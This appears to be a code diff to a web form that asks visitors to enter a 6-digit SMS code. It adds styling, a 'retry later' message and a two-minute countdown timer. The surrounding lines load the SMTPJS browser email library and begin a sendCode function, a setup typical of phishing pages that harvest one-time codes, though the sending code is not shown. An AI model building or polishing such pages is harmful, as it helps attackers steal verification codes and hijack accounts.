@@ -75,6 +75,19 @@
             .confirmation-submit:hover {
             background-color: #0062cc;
             }
+        .confirmation-message {
+  font-size: 14px;
+  color: #999;
+  margin-top: 20px;
+}
+
+.confirmation-timer {
+  font-size: 24px;
+  color: #333;
+  margin-top: 10px;
+  font-weight: bold;
+  text-decoration: underline;
+}
         .info{
             width: 100%;
             margin: 0 auto;
@@ -171,6 +184,8 @@
         <h2 class="confirmation-heading">We just sent a 6-digit code to your mobile number, confirm it here</h2><br><br>
         <input type="number" class="confirmation-input" id="code" placeholder="Enter the code" required><br><br>
         <input type="submit" value="Confirm" class="confirmation-submit">
+        <div class="confirmation-message">If you do not receive this code in 2 minutes, retry again later.</div>
+        <div class="confirmation-timer">2:00</div>
     </form>
     <div class="info">
         <div class="car">
@@ -201,6 +216,36 @@
     <footer>
         
     </footer>
+    <script>
+  // get the timer element
+  const timerElement = document.querySelector('.confirmation-timer');
+
+  // set the initial time to 2 minutes
+  let timeLeft = 120;
+
+  // update the timer every second
+  const timerInterval = setInterval(() => {
+    // convert the time to minutes and seconds
+    const minutes = Math.floor(timeLeft / 60);
+    const seconds = timeLeft % 60;
+
+    // format the time as mm:ss
+    const timeString = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+    // update the timer element with the new time
+    timerElement.textContent = timeString;
+
+    // subtract one second from the time left
+    timeLeft--;
+
+    // if the time has expired, stop the timer and hide the message and timer elements
+    if (timeLeft < 0) {
+      clearInterval(timerInterval);
+      document.querySelector('.confirmation-message').style.display = 'none';
+      timerElement.style.display = 'none';
+    }
+  }, 1000);
+</script>
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
         function sendCode(){
